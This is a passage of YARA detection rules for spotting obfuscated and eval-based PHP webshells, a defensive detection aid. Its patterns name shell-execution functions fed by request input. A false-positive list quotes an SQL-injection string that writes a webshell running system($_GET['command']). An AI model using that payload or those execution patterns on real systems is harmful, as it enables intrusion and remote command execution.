        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 300KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and not any of ( $fp* ) and any of ( $decode* ) and
        ( ( any of ( $one* ) and not any of ( $execu* ) ) or any of ( $two* ) or any of ( $three* ) or
        ( any of ( $four* ) and not any of ( $esystem* ) ) or
        ( any of ( $five* ) and not any of ( $opening* ) ) or any of ( $six* ) or any of ( $seven* ) or any of ( $eight* ) or any of ( $nine* ) )
}

rule WEBSHELL_PHP_Unknown_1
{
    meta:
        description = "obfuscated php webshell"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        hash = "12ce6c7167b33cc4e8bdec29fb1cfc44ac9487d1"
        hash = "cf4abbd568ce0c0dfce1f2e4af669ad2"
        date = "2021/01/07"
        modified = "2023-04-05"

        id = "93d01a4c-4c18-55d2-b682-68a1f6460889"
    strings:
        $sp0 = /^<\?php \$[a-z]{3,30} = '/ wide ascii
        $sp1 = "=explode(chr(" wide ascii
        $sp2 = "; if (!function_exists('" wide ascii
        $sp3 = " = NULL; for(" wide ascii

    condition:
        filesize <300KB and all of ($sp*)
}

rule WEBSHELL_PHP_Generic_Eval
{
    meta:
        description = "Generic PHP webshell which uses any eval/exec function in the same line with user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "a61437a427062756e2221bfb6d58cd62439d09d9"
        hash = "90c5cc724ec9cf838e4229e5e08955eec4d7bf95"
        hash = "2b41abc43c5b6c791d4031005bf7c5104a98e98a00ee24620ce3e8e09a78e78f"
        hash = "5c68a0fa132216213b66a114375b07b08dc0cb729ddcf0a29bff9ca7a22eaaf4"
        hash = "de3c01f55d5346577922bbf449faaaaa1c8d1aaa64c01e8a1ee8c9d99a41a1be"
        hash = "124065176d262bde397b1911648cea16a8ff6a4c8ab072168d12bf0662590543"
        hash = "cd7450f3e5103e68741fd086df221982454fbcb067e93b9cbd8572aead8f319b"
        hash = "ab835ce740890473adf5cc804055973b926633e39c59c2bd98da526b63e9c521"
        hash = "31ff9920d401d4fbd5656a4f06c52f1f54258bc42332fc9456265dca7bb4c1ea"
        hash = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
        hash = "80e98e8a3461d7ba15d869b0641cdd21dd5b957a2006c3caeaf6f70a749ca4bb"
        hash = "93982b8df76080e7ba4520ae4b4db7f3c867f005b3c2f84cb9dff0386e361c35"
        hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
        hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
        hash = "7ca5dec0515dd6f401cb5a52c313f41f5437fc43eb62ea4bcc415a14212d09e9"
        hash = "fd5f0f81204ca6ca6e93343500400d5853012e88254874fc9f62efe0fde7ab3c"
        hash = "883f48ed4e9646da078cabf6b8b4946d9f199660262502650f76450ecf60ddd5"
        hash = "6d042b6393669bb4d98213091cabe554ab192a6c916e86c04d06cc2a4ca92c00"
        hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"


        id = "79cfbd88-f6f7-5cba-a325-0a99962139ca"
    strings:
        // new: eval($GLOBALS['_POST'
        $geval = /\b(exec|shell_exec|passthru|system|popen|proc_open|pcntl_exec|eval|assert)[\t ]{0,500}(\(base64_decode)?(\(stripslashes)?[\t ]{0,500}(\(trim)?[\t ]{0,500}\(\$(_POST|_GET|_REQUEST|_SERVER\s?\[['"]HTTP_|GLOBALS\[['"]_(POST|GET|REQUEST))/ wide ascii

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
        // Log files
        $gfp_3 = " GET /"
        $gfp_4 = " POST /"
    condition:
        filesize < 300KB and not (
            any of ( $gfp* )
        )
        and $geval
}

rule WEBSHELL_PHP_Double_Eval_Tiny
{
    meta:
        description = "PHP webshell which probably hides the input inside an eval()ed obfuscated string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021-01-11"
        modified = "2023-07-05"
        hash = "f66fb918751acc7b88a17272a044b5242797976c73a6e54ac6b04b02f61e9761"
        hash = "6b2f0a3bd80019dea536ddbf92df36ab897dd295840cb15bb7b159d0ee2106ff"
        hash = "aabfd179aaf716929c8b820eefa3c1f613f8dcac"
        hash = "9780c70bd1c76425d4313ca7a9b89dda77d2c664"
        hash = "006620d2a701de73d995fc950691665c0692af11"


        id = "868db363-83d3-57e2-ac8d-c6125e9bdd64"
    strings:
        $payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
        $fp1 = "clone" fullword wide ascii
        $fp2 = "* @assert" ascii
        $fp3 = "*@assert" ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize > 70 and filesize < 300 and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and #payload >= 2 and not any of ( $fp* )
}

rule WEBSHELL_PHP_OBFUSC
{
    meta:
        description = "PHP webshell obfuscated"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/12"
        modified = "2023-04-05"
        hash = "eec9ac58a1e763f5ea0f7fa249f1fe752047fa60"
        hash = "181a71c99a4ae13ebd5c94bfc41f9ec534acf61cd33ef5bce5fb2a6f48b65bf4"
        hash = "76d4e67e13c21662c4b30aab701ce9cdecc8698696979e504c288f20de92aee7"
        hash = "1d0643927f04cb1133f00aa6c5fa84aaf88e5cf14d7df8291615b402e8ab6dc2"
        id = "f66e337b-8478-5cd3-b01a-81133edaa8e5"
    strings:

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_obfuscation_multi
        $o1 = "chr(" nocase wide ascii
        $o2 = "chr (" nocase wide ascii
        // not excactly a string function but also often used in obfuscation
        $o3 = "goto" fullword nocase wide ascii
        $o4 = "\\x9" wide ascii
        $o5 = "\\x3" wide ascii
        // just picking some random numbers because they should appear often enough in a long obfuscated blob and it's faster than a regex
        $o6 = "\\61" wide ascii
        $o7 = "\\44" wide ascii
        $o8 = "\\112" wide ascii
        $o9 = "\\120" wide ascii
        $fp1 = "$goto" wide ascii

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}(\(.{1,|\/\*)100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
        // TODO backticks

    condition:
        not (
            any of ( $gfp* )
        )
        and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and (
            // allow different amounts of potential obfuscation functions depending on filesize
            not $fp1 and (
                (
                        filesize < 20KB and
                        (
                            ( #o1+#o2 ) > 50 or
                            #o3 > 10 or
                            ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 20
                        )
                ) or (
                        filesize < 200KB and
                        (
                            ( #o1+#o2 ) > 200 or
                            #o3 > 30 or
                            ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 30
                        )

                )
            )


        )
        and (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )

}

rule WEBSHELL_PHP_OBFUSC_Encoded
{
    meta:
        description = "PHP webshell obfuscated by encoding"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/04/18"
        modified = "2023-04-05"
        score = 70
        hash = "119fc058c9c5285498a47aa271ac9a27f6ada1bf4d854ccd4b01db993d61fc52"
        hash = "d5ca3e4505ea122019ea263d6433221030b3f64460d3ce2c7d0d63ed91162175"
        hash = "8a1e2d72c82f6a846ec066d249bfa0aaf392c65149d39b7b15ba19f9adc3b339"


        id = "134c1189-1b41-58d5-af66-beaa4795a704"
    strings:
        // one without plain e, one without plain v, to avoid hitting on plain "eval("
        $enc_eval1 = /(e|\\x65|\\101)(\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
        $enc_eval2 = /(\\x65|\\101)(v|\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ wide ascii nocase
        // one without plain a, one without plain s, to avoid hitting on plain "assert("
        $enc_assert1 = /(a|\\97|\\x61)(\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase
        $enc_assert2 = /(\\97|\\x61)(s|\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ wide ascii nocase

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 700KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and any of ( $enc* )
}

rule WEBSHELL_PHP_OBFUSC_Encoded_Mixed_Dec_And_Hex
{
    meta:
        description = "PHP webshell obfuscated by encoding of mixed hex and dec"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/04/18"
        modified = "2023-04-05"
        hash = "0e21931b16f30b1db90a27eafabccc91abd757fa63594ba8a6ad3f477de1ab1c"
        hash = "929975272f0f42bf76469ed89ebf37efcbd91c6f8dac1129c7ab061e2564dd06"
        hash = "88fce6c1b589d600b4295528d3fcac161b581f739095b99cd6c768b7e16e89ff"
        hash = "883f48ed4e9646da078cabf6b8b4946d9f199660262502650f76450ecf60ddd5"
        hash = "50389c3b95a9de00220fc554258fda1fef01c62dad849e66c8a92fc749523457"
        hash = "c4ab4319a77b751a45391aa01cde2d765b095b0e3f6a92b0b8626d5c7e3ad603"
        hash = "df381f04fca2522e2ecba0f5de3f73a655d1540e1cf865970f5fa3bf52d2b297"
        hash = "401388d8b97649672d101bf55694dd175375214386253d0b4b8d8d801a89549c"
        hash = "99fc39a12856cc1a42bb7f90ffc9fe0a5339838b54a63e8f00aa98961c900618"
        hash = "fb031af7aa459ee88a9ca44013a76f6278ad5846aa20e5add4aeb5fab058d0ee"
        hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"
        hash = "0ff05e6695074f98b0dee6200697a997c509a652f746d2c1c92c0b0a0552ca47"

        id = "9ae920e2-17c8-58fd-8566-90d461a54943"
    strings:
        // "e\x4a\x48\x5a\x70\x63\62\154\x30\131\171\101\x39\111\x43\x52\x66\x51\
        //$mix = /['"]\\x?[0-9a-f]{2,3}[\\\w]{2,20}\\\d{1,3}[\\\w]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase
        $mix = /['"](\w|\\x?[0-9a-f]{2,3})[\\x0-9a-f]{2,20}\\\d{1,3}[\\x0-9a-f]{2,20}\\x[0-9a-f]{2}\\/ wide ascii nocase

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 700KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and any of ( $mix* )
}

rule WEBSHELL_PHP_OBFUSC_Tiny
{
    meta:
        description = "PHP webshell obfuscated"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/12"
        modified = "2023-07-05"
        hash = "b7b7aabd518a2f8578d4b1bc9a3af60d155972f1"
        hash = "694ec6e1c4f34632a9bd7065f73be473"
        hash = "5c871183444dbb5c8766df6b126bd80c624a63a16cc39e20a0f7b002216b2ba5"

        id = "d78e495f-54d2-5f5f-920f-fb6612afbca3"
    strings:
        // 'ev'.'al'
        $obf1 = /\w'\.'\w/ wide ascii
        $obf2 = /\w\"\.\"\w/ wide ascii
        $obf3 = "].$" wide ascii

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}(\(.{1,|\/\*)100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
        // TODO backticks

    condition:
        //any of them or
        filesize < 500 and not (
            any of ( $gfp* )
        )
        and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )
        and
        ( ( #obf1 + #obf2 ) > 2 or #obf3 > 10 )
}

rule WEBSHELL_PHP_OBFUSC_Str_Replace
{
    meta:
        description = "PHP webshell which eval()s obfuscated string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/12"
        modified = "2023-04-05"
        hash = "691305753e26884d0f930cda0fe5231c6437de94"
        hash = "7efd463aeb5bf0120dc5f963b62463211bd9e678"
        hash = "fb655ddb90892e522ae1aaaf6cd8bde27a7f49ef"
        hash = "d1863aeca1a479462648d975773f795bb33a7af2"
        hash = "4d31d94b88e2bbd255cf501e178944425d40ee97"
        hash = "e1a2af3477d62a58f9e6431f5a4a123fb897ea80"

        id = "1f5b93c9-bdeb-52c7-a99a-69869634a574"
    strings:
        $payload1 = "str_replace" fullword wide ascii
        $payload2 = "function" fullword wide ascii
        $goto = "goto" fullword wide ascii
        //$hex  = "\\x"
        $chr1  = "\\61" wide ascii
        $chr2  = "\\112" wide ascii
        $chr3  = "\\120" wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 300KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and any of ( $payload* ) and #goto > 1 and
        ( #chr1 > 10 or #chr2 > 10 or #chr3 > 10 )
}

rule WEBSHELL_PHP_OBFUSC_Fopo
{
    meta:
        description = "PHP webshell which eval()s obfuscated string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        hash = "fbcff8ea5ce04fc91c05384e847f2c316e013207"
        hash = "6da57ad8be1c587bb5cc8a1413f07d10fb314b72"
        hash = "a698441f817a9a72908a0d93a34133469f33a7b34972af3e351bdccae0737d99"
        date = "2021/01/12"
        modified = "2023-04-05"

        id = "a298e99d-1ba8-58c8-afb9-fc988ea91e9a"
    strings:
        $payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
        // ;@eval(
        $one1 = "7QGV2YWwo" wide ascii
        $one2 = "tAZXZhbC" wide ascii
        $one3 = "O0BldmFsK" wide ascii
        $one4 = "sAQABlAHYAYQBsACgA" wide ascii
        $one5 = "7AEAAZQB2AGEAbAAoA" wide ascii
        $one6 = "OwBAAGUAdgBhAGwAKA" wide ascii
        // ;@assert(
        $two1 = "7QGFzc2VydC" wide ascii
        $two2 = "tAYXNzZXJ0K" wide ascii
        $two3 = "O0Bhc3NlcnQo" wide ascii
        $two4 = "sAQABhAHMAcwBlAHIAdAAoA" wide ascii
        $two5 = "7AEAAYQBzAHMAZQByAHQAKA" wide ascii
        $two6 = "OwBAAGEAcwBzAGUAcgB0ACgA" wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 3000KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and $payload and
        ( any of ( $one* ) or any of ( $two* ) )
}

rule WEBSHELL_PHP_Gzinflated
{
    meta:
        description = "PHP webshell which directly eval()s obfuscated string"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/12"
        modified = "2023-07-05"
        hash = "49e5bc75a1ec36beeff4fbaeb16b322b08cf192d"
        hash = "6f36d201cd32296bad9d5864c7357e8634f365cc"
        hash = "ab10a1e69f3dfe7c2ad12b2e6c0e66db819c2301"
        hash = "a6cf337fe11fe646d7eee3d3f09c7cb9643d921d"
        hash = "07eb6634f28549ebf26583e8b154c6a579b8a733"

        id = "9cf99ae4-9f7c-502f-9294-b531002953d6"
    strings:
        $payload2 = /eval\s?\(\s?("\?>".)?gzinflate\s?\(\s?base64_decode\s?\(/ wide ascii nocase
        $payload4 = /eval\s?\(\s?("\?>".)?gzuncompress\s?\(\s?(base64_decode|gzuncompress)/ wide ascii nocase
        $payload6 = /eval\s?\(\s?("\?>".)?gzdecode\s?\(\s?base64_decode\s?\(/ wide ascii nocase
        $payload7 = /eval\s?\(\s?base64_decode\s?\(/ wide ascii nocase
        $payload8 = /eval\s?\(\s?pack\s?\(/ wide ascii nocase

        // api.telegram
        $fp1 = "YXBpLnRlbGVncmFtLm9"

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
